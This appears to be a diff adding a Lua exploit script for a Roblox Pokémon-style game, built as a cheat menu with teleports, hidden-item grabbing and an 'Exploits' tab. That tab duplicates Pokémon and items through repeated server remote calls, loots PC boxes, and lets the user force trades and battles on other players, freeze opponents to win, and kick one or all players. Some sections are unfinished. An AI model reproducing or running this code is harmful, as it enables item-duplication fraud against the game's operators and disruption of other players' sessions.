+    Name = "Buy Sushi (gives berries + prism scales) 🍣",
+    Description = nil,
+    Callback = function()
+        local _p = nil
+        for _, v in pairs(getgc(true)) do
+            if typeof(v) == "table" then
+                if rawget(v, "PlayerData") then
+                    _p = v
+                    break
+                end
+            end
+        end
+        _p.Network:get("PDS", "buySushi") -- = PlayerData:buySushi() ?
+    end
+}
+--[[
+    CHUNK LOADER
+]]
+local Tab =
+    GUI:Tab {
+    Name = "Location",
+    Icon = "rbxassetid://12315883004"
+}
+
+local section = Tab:section{
+    Name = "Teleports" -- default
+  }
+
+section:Textbox {
+    Name = "Chunk Loader 🌻",
+    Callback = function(id)
+       
+    end
+}
+
+section:dropdown(
+    {
+        Name = "Pokemon City 🏥",
+        StartingText = "Chunk",
+        Items = {
+            {"Mitis Town", 1},
+            {"Chesma Town", 2},
+            {"Silvent City", 3},
+            {"Brimber City", 5},
+            {"Lagoona Lake", 9},
+            {"Rosecove City", 11},
+            {"Aredia City", 25},
+            {"Fluoruma City", 39},
+            {"Frostveil City", 46},
+            {"Port Decca", 52},
+            {"Crescent Town", 54}
+        },
+        Description = "This teleports you to your desired city",
+        Callback = function(v)
+            _p.DataManager:loadChunk("chunk" .. v)
+            _p.Menu.options:getUnstuck(true)
+        end
+    }
+)
+
+section:dropdown(
+    {
+        Name = "RTD Worlds 🌎",
+        StartingText = "Chunk",
+        Items = {
+            {"Trade Resort 🏖️", 1},
+            {"Battle Colloseum 🏛️", 2},
+            {"Adventure 🏞️", 3}
+        },
+        Description = "This teleports you to your desired city",
+        Callback = function(v)
+            
+            if(v == 1) then -- trade resort
+            local plr = game:GetService("Players").LocalPlayer
+            local TeleportService = game:GetService("TeleportService")
+            TeleportService:Teleport(10628142719, plr)
+            end
+
+            if(v == 2) then -- battle coll
+            local plr = game:GetService("Players").LocalPlayer
+            local TeleportService = game:GetService("TeleportService")
+            TeleportService:Teleport([[still need to get]], plr)
+            end
+
+            if(v == 3) then -- adventure
+            local plr = game:GetService("Players").LocalPlayer
+            local TeleportService = game:GetService("TeleportService")
+            TeleportService:Teleport(10573403836, plr)
+            end
+
+        end
+    }
+)
+
+section:dropdown(
+    {
+        Name = "Locations 📋",
+        StartingText = "Chunk",
+        Items = {
+            {"Chunk 1 (Mitis Town + Route 1)", 1},
+            {"Chunk 2 (Cheshma Town + Gale Forest + Route 2)", 2},
+            {"Chunk 3 (Route 3 + Silvent City + Route 4)", 3},
+            {"Chunk 4 (Route 5 + Old Graveyard", 4},
+            {"Chunk 5 (Brimber City", 5},
+            {"Chunk 6 (Route 6", 6},
+            {"Chunk 7 (Mt. Igneus)", 7},
+            {"Chunk 8 (Route 7)", 8},
+            {"Chunk 9 (Lagoona Lake)", 9},
+            {"Chunk 10 (Route 8)", 10},
+            {"Chunk 11 (Rosecove City + Rosecove Beach)", 11},
+            {"Chunk 12 (Route 9)", 12},
+            {"Chunk 13 (Fortulose Manor)", 13},
+            {"Chunk 14 (Grove of Dreams)", 14},
+            {"Chunk 15 (Route 10)", 15},
+            {"Chunk 16 (Cragonos Mines)", 16},
+            {"Chunk 17 (Cragonos Cliffs again)", 17},
+            {"Chunk 18 (Cragonos Peak)", 18},
+            {"Chunk 19 (Anthian City - Housing District)", 19},
+            {"Chunk 20 (Anthian City - Shopping District)", 20},
+            {"Chunk 21 (Anthian City - Battle District)", 21},
+            {"Chunk 22 (Anthian City - Park District)", 22},
+            {"Chunk 23 (Anthian Sewer)", 23},
+            {"Chunk 24 (Route 11)", 24},
+            {"Chunk 25 (Aredia City)", 25},
+            {"Chunk 26 (Glistening Grotto)", 26},
+            {"Chunk 27 (Old Aredia)", 27},
+            {"Chunk 28 (Desert Castle Ruins 1)", 28},
+            {"Chunk 29 (Desert Castle Ruins 2)", 29},
+            {"Chunk 30 (Desert Castle Ruins 3)", 30},
+            {"Chunk 31 (Desert Castle Ruins 4)", 31},
+            {"Chunk 32 (Desert Castle Ruins 5)", 32},
+            {"Chunk 33 (Desert Castle Ruins 6)", 33},
+            {"Chunk 34 (Desert Castle Ruins 7 + Victini)", 34},
+            {"Chunk 35 (Desert Catacombs)", 35},
+            {"Chunk 36 (Route 12)", 36},
+            {"Chunk 37 (Nature's Den)", 37},
+            {"Chunk 38 (Route 13)", 38},
+            {"Chunk 39 (Fluoruma City)", 39},
+            {"Chunk 40 (Igneus Depths)", 40},
+            {"Chunk 41 (Chamber of the Jewel)", 41},
+            {"Chunk 42 (Route 14  1)", 42},
+            {"Chunk 43 (Route 14  2", 43},
+            {"Chunk 44 (Cragonos Sanctuary)", 44},
+            {"Chunk 45 (Route 15)", 45},
+            {"Chunk 46 (Frostveil City)", 46},
+            {"Chunk 47 (Route 16)", 47},
+            {"Chunk 48 (Freezing Fissure)", 48},
+            {"Chunk 51 (Cosmeos Valley)", 51},
+            {"Chunk 52 (Port Decca)", 52},
+            {"Chunk 53 (Decca Beach)", 53},
+            -- needs finishing [ halfway done !!!]
+
+
+
+        },
+        Description = "This teleports you to selected location.",
+        Callback = function(v)
+
+            _p.DataManager:loadChunk("chunk" .. v)
+            _p.Menu.options:getUnstuck(true)
+            
+            _p.Menu:enable()
+            _p.MasterControl.WalkEnabled = true
+        end
+    }
+  )
+
+  local section = Tab:section{
+    Name = "Items" -- default
+  }
+
+  section:dropdown(
+    {
+        Name = "Find Hidden Pokeballs 🕵 (1x use)",
+        StartingText = "Chunk",
+        Items = {
+            {"Chunk 1 (Mitis Town + Route 1)", 1},
+            {"Chunk 2 (Cheshma Town + Gale Forest + Route 2)", 2},
+            {"Chunk 3 (Route 3 + Silvent City + Route 4)", 3},
+            {"Chunk 4 (Route 5 + Old Graveyard", 4},
+            {"Chunk 5 (Brimber City", 5},
+            {"Chunk 6 (Route 6", 6},
+            {"Chunk 7 (Mt. Igneus)", 7},
+            {"Chunk 8 (Route 7)", 8},
+            {"Chunk 9 (Lagoona Lake)", 9},
+            {"Chunk 10 (Route 8)", 10},
+            {"Chunk 11 (Rosecove City + Rosecove Beach)", 11},
+            {"Chunk 12 (Route 9)", 12},
+            {"Chunk 13 (Fortulose Manor)", 13},
+            {"Chunk 14 (Grove of Dreams)", 14},
+            {"Chunk 15 (Route 10)", 15},
+            {"Chunk 16 (Cragonos Mines)", 16},
+            {"Chunk 17 (Cragonos Cliffs again)", 17},
+            {"Chunk 18 (Cragonos Peak)", 18},
+            {"Chunk 19 (Anthian City - Housing District)", 19},
+            {"Chunk 20 (Anthian City - Shopping District)", 20},
+            {"Chunk 21 (Anthian City - Battle District)", 21},
+            {"Chunk 22 (Anthian City - Park District)", 22},
+            {"Chunk 23 (Anthian Sewer)", 23},
+            {"Chunk 24 (Route 11)", 24},
+            {"Chunk 25 (Aredia City)", 25},
+            {"Chunk 26 (Glistening Grotto)", 26},
+            {"Chunk 27 (Old Aredia)", 27},
+            {"Chunk 28 (Desert Castle Ruins 1)", 28},
+            {"Chunk 29 (Desert Castle Ruins 2)", 29},
+            {"Chunk 30 (Desert Castle Ruins 3)", 30},
+            {"Chunk 31 (Desert Castle Ruins 4)", 31},
+            {"Chunk 32 (Desert Castle Ruins 5)", 32},
+            {"Chunk 33 (Desert Castle Ruins 6)", 33},
+            {"Chunk 34 (Desert Castle Ruins 7 + Victini)", 34},
+            {"Chunk 35 (Desert Catacombs)", 35},
+            {"Chunk 36 (Route 12)", 36},
+            {"Chunk 37 (Nature's Den)", 37},
+            {"Chunk 38 (Route 13)", 38},
+            {"Chunk 39 (Fluoruma City)", 39},
+            {"Chunk 40 (Igneus Depths)", 40},
+            {"Chunk 41 (Chamber of the Jewel)", 41},
+            {"Chunk 42 (Route 14  1)", 42},
+            {"Chunk 43 (Route 14  2", 43},
+            {"Chunk 44 (Cragonos Sanctuary)", 44},
+            {"Chunk 45 (Route 15)", 45},
+            {"Chunk 46 (Frostveil City)", 46},
+            {"Chunk 47 (Route 16)", 47},
+            {"Chunk 48 (Freezing Fissure)", 48},
+            {"Chunk 51 (Cosmeos Valley)", 51},
+            {"Chunk 52 (Port Decca)", 52},
+            {"Chunk 53 (Decca Beach)", 53},
+
+            -- needs finishing [ halfway done !!!]
+
+
+
+        },
+        Description = "This teleports hidden pokeballs to you (must be in right chunk)",
+        Callback = function(v)
+
+            
+
+            if(v == 1) then 
+                -- Chunk 1
+                local lp = game:service "Players".LocalPlayer       
+                local plr1 = game.Players.LocalPlayer.Character
+                
+                game:GetService("Workspace").chunk1["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk1["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk1["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk1["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk1["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk1["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk1["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk1["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk1["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk1["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk1["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk1["#Item"]:Destroy() 
+                wait(.5)
+        
+            
+        end
+
+
+            if(v == 2) then 
+                -- Chunk 2
+                local lp = game:service "Players".LocalPlayer       
+                local plr1 = game.Players.LocalPlayer.Character
+                
+                game:GetService("Workspace").chunk2["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk2["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk2["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk2["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk2["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk2["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk2["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk2["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk2["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk2["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk2["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk2["#Item"]:Destroy() 
+                wait(.5)
+                
+        
+            
+        end
+
+
+            if(v == 3) then 
+                -- Chunk 3
+                local lp = game:service "Players".LocalPlayer       
+                local plr1 = game.Players.LocalPlayer.Character
+                
+                game:GetService("Workspace").chunk3["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk3["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk3["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk3["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk3["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk3["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk3["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk3["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk3["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk3["#Item"]:Destroy() 
+                wait(.5)
+                game:GetService("Workspace").chunk3["#Item"]:MoveTo(lp.Character.LeftHand.Position)
+                wait(2)
+                plr1.HumanoidRootPart.CFrame = plr1.HumanoidRootPart.CFrame * CFrame.new(0,1.8,0)
+                wait(5)
+                game:GetService("Workspace").chunk3["#Item"]:Destroy() 
+                wait(.5)
+        
+                   
+        end   
+
+
+                -- needs finishing
+
+
+                -- needs finishing
+
+
+                -- needs finishing
+
+
+                -- needs finishing
+
+
+                -- needs finishing
+
+
+                -- needs finishing
+
+
+
+
+
+
+
+
+
+
+
+
+
+        end
+    }
+  )
+
+
+
+
+
+local Tab =
+    GUI:Tab {
+    Name = "Exploits",
+    Icon = "rbxassetid://12085096593"
+}
+local playertc
+local playertab = {}
+for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+    table.insert(playertab, v.Name)
+end
+
+--[[
+    Dupe Glitch
+]]
+
+
+local piss
+
+local section = Tab:section{
+    Name = "Dupe Exploit" -- default
+  }
+
+section:Button {
+    Name = "Open PC 🖥️",
+    Description = "Opens PC. (can kick you. Make sure to save.)",
+    Callback = function()
+        syn.secure_call(_p.Menu.pc.bootUp, localPlayer.PlayerScripts.ChatScript, _p.Menu.pc)
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true
+    end
+}
+
+section:dropdown(
+    {
+        Name = "Dupe Fill PC Box [🌐]",
+        StartingText = "PC Box #",
+        Items = {
+            {"Box 1", 1},
+            {"Box 2", 2},
+            {"Box 3", 3},
+            {"Box 4", 4},
+            {"Box 5", 5},
+            {"Box 6", 6}
+        },
+        Description = "This fills a PC box with duped party slot [2]",
+        Callback = function(v)
+            
+            if(_p.PlayerData.money < 3000) then
+                GUI:Notification
+                            {
+                                Title = "Notification",
+                                Text = "Insufficient funds ❌",
+                                Duration = 6,
+                            }
+
+                            GUI:Notification
+                            {
+                                Title = "Notification",
+                                Text = "You need 💵 ".. 3000 - _p.PlayerData.money.." more pokedollars.",
+                                Duration = 6,
+                            }
+            end
+
+            if(_p.PlayerData.money >= 3000) then
+
+            for i = 1, 30 do
+                
+                if(i == 1) then
+                GUI:Notification
+                {
+                    Title = "Notification",
+                    Text = "Don't move 🛑! Pokemon dupe loop is running ⏳.",
+                    Duration = 6,
+                }
+                end
+
+                if(i == 30) then
+                    GUI:Notification
+                    {
+                        Title = "Notification",
+                        Text = "Complete ✅! Pokemon dupe loop is finished.",
+                        Duration = 6,
+                    }
+
+    
+                    GUI:Notification
+                    {
+                        Title = "Notification",
+                        Text = "Your remaining balance is: 💵 ".._p.PlayerData.money..".",
+                        Duration = 6,
+                    }
+                end
+
+                local pcs = _p.Network:get("PDS", "openPC")
+    
+            _p.Network:get("PDS", "leaveDCPokemon", 2)
+                wait(0.01)
+            _p.Network:get("PDS", "closePC", pcs.id, {
+                    ["m"] = {
+                        ["2"] = {
+                            [1] = v,
+                            [2] = i
+                        }
+                    },
+                    ["h"] = {
+                        ["2"] = true
+                    },
+                    ["cb"] = 1
+                })
+
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+
+            end
+        end
+    end
+    
+    }
+)
+
+section:Button {
+    Name = "Loot Box [🤑] ",
+    Description = "(gets all items from PC box) box [1]",
+    Callback = function()
+        
+
+
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Box 1 is being looted.",
+            Duration = 6,
+        }
+
+       
+
+        
+        for i = 1, 30 do
+            
+            if(i == 1) then
+                GUI:Notification
+                {
+                    Title = "Notification",
+                    Text = "Don't move 🛑! Pokemon looting loop is running ⏳.",
+                    Duration = 6,
+                }
+                end
+
+                if(i == 30) then
+                    GUI:Notification
+                    {
+                        Title = "Notification",
+                        Text = "Complete ✅! Pokemon looting loop is finished.",
+                        Duration = 6,
+                    }
+                    end
+
+            local pcs = _p.Network:get("PDS", "openPC")
+      
+        _p.Network:get("PDS", "cPC", "takeItem", i)
+   
+        _p.Network:get("PDS", "cPC", "getItem", i)
+
+        end
+
+    end
+}
+
+
+
+
+section:Button {
+    Name = "save 💾",
+    Description = nil,
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Your data has been saved 💾.",
+            Duration = 6,
+        }
+    _p.PlayerData:save()
+    
+    syn.secure_call(_p.saveGame)
+    _p.Menu:enable()
+    _p.MasterControl.WalkEnabled = true
+    end
+}
+
+local section = Tab:section{
+    Name = "Seller Tools" -- default
+  }
+
+  section:Textbox {
+    Name = "Insert Item Name 🗳️",
+    Callback = function(str)
+        piss = tostring(str)
+    end
+}
+
+
+local dupecount = 1
+section:Button {
+    Name = "Dupe✨ ([Slot 2 - pokemon]) ",
+    Description = "This will dupe your second slot pokemon + item. (goes to first box, slot 1)",
+    Callback = function()
+        
+        if(dupecount == 1) then
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "You have duped ".. dupecount .. " time.",
+            Duration = 6,
+        }
+        end
+
+        if(dupecount > 1) then
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "You have duped ".. dupecount .. " times.",
+            Duration = 6,
+        }
+        end
+
+        dupecount = dupecount + 1
+
+local pcs = _p.Network:get("PDS", "openPC")
+_p.Network:get("PDS", "leaveDCPokemon", 2)
+wait(0.2)
+_p.Network:get("PDS", "closePC", pcs.id, {
+        ["m"] = {
+            ["2"] = {
+                [1] = 1, -- box
+                [2] = 1 -- slot
+            }
+        },
+        ["h"] = {
+            ["2"] = true
+        },
+        ["cb"] = 1
+    })
+wait(.1)
+_p.Network:get("PDS", "takeDCPokemon", 1)
+wait(.1)
+_p.Network:get("PDS", "takeDCPokemon", 1)
+wait(.1)  
+    end
+}
+
+section:Button {
+    Name = "Give Items (x6) 🎁",
+    Description = "Gives each pokemon in your party the same item. (if you have it)",
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Items given to party Pokemon.",
+            Duration = 6,
+        }
+
+        for i = 1,6 do
+            _p.Network:get("PDS", "giveItem", piss, i, true)
+        end
+    end
+}
+
+section:Button {
+    Name = "Take Items (x6) 🎁",
+    Description = "Takes each pokemon in your party's same item. (if they're holding any)",
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Party Pokemon's items taken.",
+            Duration = 6,
+        }
+
+        for i = 1,6 do
+            _p.Network:get("PDS", "takeItem", piss, i, true)
+        end
+    end
+}
+
+local section = Tab:section{
+    Name = "Within PC" -- default
+  }
+
+local text
+section:Textbox {
+    Name = "Type Name 🆔",
+    Callback = function(str)
+        text = str
+    end
+}
+
+section:dropdown(
+    {
+        Name = "Name Changer 🌐",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This changes your selected pokemon'(s) name",
+        Callback = function(v)
+            GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Your Pokemon Slot ("..v..")'s".." new name is: " .. text,
+            Duration = 6,
+        }
+            _p.Network:get("PDS", "openPC")
+            _p.Network:get("PDS", "cPC", "nickname", v, text)
+        end
+    }
+)
+
+section:dropdown(
+    {
+        Name = "Wallpaper Changer 📱",
+        StartingText = "Select Wallpaper",
+        Items = {
+            {"Leaves", 1},
+            {"Magma", 2},
+            {"Ocean", 3},
+            {"Lightning", 4},
+            {"Desert", 5},
+            {"Steel", 6},
+            {"Shadowy", 7},
+            {"Void", 8},
+            {"Rocks", 9},
+            {"Icy", 10},
+            {"Clouds", 11},
+            {"Volcano", 12},
+            {"Beach", 13},
+            {"Charizards", 14},
+            {"Iceberg", 15},
+            {"Charizards", 16},
+            {"Waterfall", 17},
+            {"City", 18},
+            {"Space", 19},
+            {"Helmet", 20},
+            {"Rainbow", 21},
+            {"Girds", 22},
+            {"Gardevoir", 32},
+            {"Eeveelutions", 24},
+            {"Team Eclipse", 25},
+            {"PBB", 26},
+            {"RGB", 27},
+            {"Scorbunny", 28},
+            {"Hearts", 29},
+            {"Sprinkles", 30}
+        },
+        Description = "Changes all pc wallpapers to selected one",
+        Callback = function(v)
+            q = 50
+            for i = 1, q do
+                _p.Network:get("PDS", "openPC")
+                _p.Network:get("PDS", "cPC", "setWPaper", i, v)
+            end
+        end
+    }
+)
+
+
+local section = Tab:section{
+    Name = "These work very well in Project Bronze Victors" -- default
+  }
+
+section:dropdown(
+    {
+        Name = "Select Player 🗳️",
+        StartingText = "Player...",
+        Items = playertab,
+        Description = "Select any player in the game.",
+        Callback = function(v)
+            playertc = v
+        end
+    }
+)
+
+local section = Tab:section{
+    Name = "Force Trade" -- default
+  }
+
+section:Button {
+    Name = "Force Initiated Trade With Player ⚖️",
+    Description = "Forces you and target to enter a trade together.",
+    Callback = function()
+        forcetrade(game:GetService("Players")[playertc])
+    end
+}
+section:Button {
+    Name = "Force Initiated Trade All ⚖️🤼",
+    Description = "Forces you and a random to enter a trade together.",
+    Callback = function()
+        for _, plr in pairs(game:GetService("Players"):GetChildren()) do
+            if plr.Name ~= localPlayer.Name then
+                forcetrade(playertc)
+            end
+        end
+    end
+}
+
+local section = Tab:section{
+    Name = "Kick" -- default
+  }
+
+  section:Button {
+    Name = "Kick Player ✨",
+    Description = nil,
+    Callback = function()
+        _p.Menu:disable()
+        _p.MasterControl.WalkEnabled = false
+        _p.NPCChat:say("Would you like to kick " .. playertc .. "?")
+        local options = {"Kick", "Cancel"}
+        local choice = options[_p.NPCChat:choose(unpack(options))]
+        if choice == "Kick" then
+            _p.NPCChat:say("Kicked " .. playertc .. "!")
+            wait(.1)
+            chunkrev(game:GetService("Players")[playertc])
+            _p.Menu:enable()
+            _p.MasterControl.WalkEnabled = true
+        elseif choice == "Cancel" then
+            _p.NPCChat:say("Sucessfully Cancelled.")
+            print(choice)
+            _p.Menu:enable()
+            _p.MasterControl.WalkEnabled = true
+        end
+    end
+}
+
+section:Button {
+    Name = "Kick All Players ✨",
+    Description = nil,
+    Callback = function()
+        for _, plr in pairs(game:GetService("Players"):GetChildren()) do
+            if plr.Name ~= localPlayer.Name then
+                chunkrev(plr)
+            end
+        end
+    end
+}
+
+local section = Tab:section{
+    Name = "Battle" -- default
+  }
+
+section:Button {
+    Name = "Force Battle With Player⚔️",
+    Description = "Forces you and target to enter a battle together.",
+    Callback = function()
+        forcebattle(game:GetService("Players")[plr2])
+    end
+}
+
+section:Button {
+    Name = "Force Win With Player⚔️🏆",
+    Description = "Frezes the other player, causing you to win.",
+    Callback = function()
+        autowin("p2")
+        autowin("p1")
+    end
+}
+--[[
+⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣶⣶⣶⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
+⠀⠀⢀⣴⣿⣿⣿⣿⣿⣟⠉⠀⠙⣿⣿⣿⠿⠿⢯⠹⣿⣦⡀⠀⠀
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⠋⠀⠀⣀⣀⠈⠻⣿⣷⡀⠀
+⠀⣾⢟⣿⣿⣿⣿⣙⣿⣿⣿⣿⣿⠇⠀⠀⠀⣿⣉⡇⠀⠸⣿⣷⠀
+⢸⣿⣾⣿⡿⠉⠻⠿⢿⣿⣿⣿⣿⡄⠀⠀⢰⡟⠻⣧⠀⠀⣿⣿⡆
+⢸⣿⣿⣿⣷⡆⠀⠀⠀⢨⣿⣿⣿⣷⡀⠀⠈⠳⠾⠋⠀⢠⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣷⣤⣠⣾⣿⣿⣿⣿⣷⣤⣀⠀⠀⣀⣤⣿⣿⣿⠃
+⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀
+⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
+⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀
+⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀
+
+--]]
+
+-- 
+
+
+
